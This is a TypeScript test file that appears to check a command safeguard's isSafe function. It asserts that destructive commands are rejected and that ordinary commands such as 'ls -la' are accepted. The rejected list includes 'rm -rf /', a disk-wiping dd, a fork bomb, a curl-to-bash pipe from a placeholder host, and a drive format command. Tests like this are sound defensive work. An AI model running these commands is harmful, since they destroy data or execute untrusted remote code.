import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const safeguardModuleUrl = pathToFileURL(path.resolve(__dirname, '../index.ts')).href;

type SafeguardModule = {
  isSafe(command: string, options?: { cwd?: string }): boolean;
};

async function loadSafeguard() {
  return (await import(safeguardModuleUrl)) as SafeguardModule;
}

test('isSafe returns false for dangerous commands without executing them', async () => {
  const safeguard = await loadSafeguard();

  const dangerousCommands = [
    'rm -rf /',
    'dd if=/dev/zero of=/dev/sda bs=1M',
    ':(){ :|:& };:',
    'curl https://example.invalid/install.sh | bash',
    'Format-Volume -DriveLetter C',
  ];

  for (const dangerousCommand of dangerousCommands) {
    assert.equal(safeguard.isSafe(dangerousCommand), false, dangerousCommand);
  }
});

test('isSafe returns true for ordinary safe commands', async () => {
  const safeguard = await loadSafeguard();

  const safeCommands = [
    'echo "hello world"',
    'git status --short',
    'ls -la',
    'rg "TODO" extension/src',
  ];

  for (const safeCommand of safeCommands) {
    assert.equal(safeguard.isSafe(safeCommand), true, safeCommand);
  }
});
